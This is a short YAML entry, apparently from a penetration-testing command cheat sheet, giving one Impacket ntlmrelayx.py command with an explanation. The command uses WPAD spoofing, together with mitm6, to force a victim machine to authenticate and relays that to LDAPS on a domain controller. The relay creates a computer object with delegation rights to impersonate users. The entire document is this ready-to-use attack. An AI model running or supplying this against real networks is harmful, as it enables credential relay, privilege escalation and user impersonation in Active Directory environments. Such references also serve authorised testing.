commands:
- template: python3 ntlmrelayx.py -t ldaps://dc.test.local -wh test-wpad --delegate-access
  comment: "Impacket's ntlmrelayx.py performs NTLM Relay Attacks, creating an SMB and HTTP server and\
    \ relaying credentials to various different protocols (SMB, HTTP, LDAP, etc.).\n\nThe below command\
    \ will perform WPAD spoofing to force the victim machine to authenticate to the attacker controlled\
    \ host. The command will then relay the authentication to create a new computer object and grant it\
    \ delegation rights to impersonate users on the victim machine. This command should be used in conjunction\
    \ with mitm6.\n\nCommand Reference:\n\n\tTarget Domain Controller: dc.test.local\n"
